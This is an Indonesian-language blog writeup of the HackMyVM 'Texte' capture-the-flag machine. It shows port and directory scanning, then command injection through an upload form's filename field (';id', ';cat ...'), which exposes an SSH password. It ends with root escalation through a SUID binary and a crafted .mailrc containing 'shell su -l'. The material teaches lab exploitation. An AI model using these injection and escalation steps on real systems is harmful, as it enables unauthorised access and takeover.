---
layout: Post
title: HackMyVM - Texte Writeup
date: 2021-10-14 21:31 WIB  
---
<h1 align="center" style="font-size:30px;">
  <br>
  <a href="https://downloads.hackmyvm.eu/texte.zip">Texte</a>
  <br>
</h1>

<h4 align="center"> Author: <a href="https://twitter.com/x6cx61x63x61x73">sml</a></h4>

## NMAP

Oke seperti biasa pertama yang kita lakukan ialan scan port yang ada di dalam vm tersebut dengan `nmap` :

```console
┌─[root@Kiyo] - [~/Kiyo/HackMyVM/TEXTE] - [10482]
└─[$] nmap -A 192.168.0.197                                                                                                [21:39:14]
Starting Nmap 7.70 ( https://nmap.org ) at 2021-10-15 21:42 WIB
Nmap scan report for vinci.hmv (192.168.0.197)
Host is up (0.00063s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: TexteBoard
MAC Address: 08:00:27:22:44:E2 (Oracle VirtualBox virtual NIC)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.70%E=4%D=10/15%OT=22%CT=1%CU=38061%PV=Y%DS=1%DC=D%G=Y%M=080027%
OS:TM=61699366%P=x86_64-pc-linux-gnu)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%TS=A
OS:)SEQ(SP=FF%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4S
OS:T11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=
OS:FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=
OS:M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)
OS:T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S
OS:+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G
OS:%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)
```

## Scan Directory

Next setelah kita tahu adanya port 80, kita scan directory apa saja yang ada di web tersebut dengan `gobuster` :

```console
┌─[root@Kiyo] - [~/Kiyo/HackMyVM/TEXTE] - [10477]
└─[$] gobuster dir -u http://192.168.0.197/  -x php,html,js,txt -w /opt/wordlist/medium.txt                                [21:31:52]
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.0.197/
[+] Threads:        10
[+] Wordlist:       /opt/wordlist/medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Extensions:     html,js,txt,php
[+] Timeout:        10s
===============================================================
2021/10/15 21:31:58 Starting gobuster
===============================================================
/index.html (Status: 200)
/upload.php (Status: 200)
===============================================================
```

## Burpsuite

Setelah di scan disini ada file `upload.php`, disini ku menggunakan burp suite untuk mendapatan password dari si user yang ada di vm itu.  Untuk pentest pertama upload dulu file ku saranin gambar biar gampang. Oya untuk vuln kali ini yaitu file yang di upload untuk selebihnya kalian bisa baca disini `https://book.hacktricks.xyz/pentesting-web/file-upload#from-file-upload-to-other-vulnerabilities`. :

```console
Content-Disposition: form-data; name="myFile"; filename=";id"
Content-Type: image/png

Output :
File uploaded
<img src="data:image/png;base64,uid=33(www-data) gid=33(www-data) groups=33(www-data)
" alt="Happy" />
```

And boom ternyata bisa oke next ku coba melihat isi file nya dengan command `ls -al`. Oya tanda `;` supaya sistem bacanya string :

```console
Content-Disposition: form-data; name="myFile"; filename=";ls -al"
Content-Type: image/png

Output : 
File uploaded
<img src="data:image/png;base64,total 20
drwxr-xr-x 2 root     root     4096 Oct  8 05:43 .
drwxr-xr-x 3 root     root     4096 Oct  8 05:41 ..
-rw-r--r-- 1 www-data www-data  476 Oct  8 05:43 index.html
-rw-r--r-- 1 www-data www-data   23 Oct  8 05:43 uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt
-rw-r--r-- 1 www-data www-data  961 Oct  8 05:43 upload.php
" alt="Happy" />
```

Ada file mencurigakan nih `uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt`. Dan ternyata ketika ku buka terdapat password user ssh kamila :u 

```console
Content-Disposition: form-data; name="myFile"; filename=";cat uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt"
Content-Type: image/png

Output :
File uploaded
<img src="data:image/png;base64,kamila/h*****$$$hahaha
" alt="Happy" />
```

## SSH

Oya setelah dapet akhirnya flag user ku berhasil dapetin :

```console
kamila@texte:~$ ls
user.txt
kamila@texte:~$ cat user.txt 
*****need***
kamila@texte:~$ 
```

Next setelah dapet password dan user SSH gua bakal cek SUID nya untuk dapetin akses root dengan command `find / -perm -4000 -exec ls -la {} \; 2>/dev/null` :

```console
kamila@texte:~$ find / -perm -4000 -exec ls -la {} \; 2>/dev/null
-rwsr-sr-x 1 root kamila 15560 Oct  8 05:46 /opt/texte
-rwsr-xr-- 1 root messagebus 50656 Feb 21  2021 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 534076 Mar 13  2021 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 66292 Feb  7  2020 /usr/bin/passwd
-rwsr-xr-x 1 root root 79396 Jul 28 15:09 /usr/bin/su
-rwsr-xr-x 1 root root 43252 Feb  7  2020 /usr/bin/newgrp
-rwsr-xr-x 1 root root 50720 Jul 28 15:09 /usr/bin/mount
-rwsr-xr-x 1 root root 47908 Feb  7  2020 /usr/bin/chsh
-rwsr-xr-x 1 root root 56836 Feb  7  2020 /usr/bin/chfn
-rwsr-xr-x 1 root root 30236 Jul 28 15:09 /usr/bin/umount
-rwsr-xr-x 1 root root 86660 Feb  7  2020 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 1457924 Jul 13 12:04 /usr/sbin/exim4                                           
```

Dan ternyata terdapat file binary `texte` setelah ku cek ada register apa saja and boom terdapat `setuid dan setgid`. Oleh karena itu ku manfaatkan , tapi ada ketentuan dimana hanya di `/usr/bin/mail` saja file texte akan bekerja :

```console
kamila@texte:~$ strings /opt/texte 
******
setuid
system
******
setgid
******
/usr/bin/mail -s 'Remember,dont upload PHP files.' kamila@localhost
```

Ku berpikir sejenak akhirnya ku buat file .mailrc dan menambahkan `shell su -l` yang dimana gua akan dapet shell root. Oya gua dapet referensi dari sini `https://mailutils.org/manual/html_section/configuration.html#configuration` : 

```console
kamila@texte:~$ echo 'shell su -l' > .mailrc
kamila@texte:~$ /opt/texte
root@texte:~#                                     
```

And boom dapet shell root gas aja dapetin flagnya : 

```console
root@texte:~# ls
root.txt
root@texte:~# cat root.txt 
I******xtEs
```
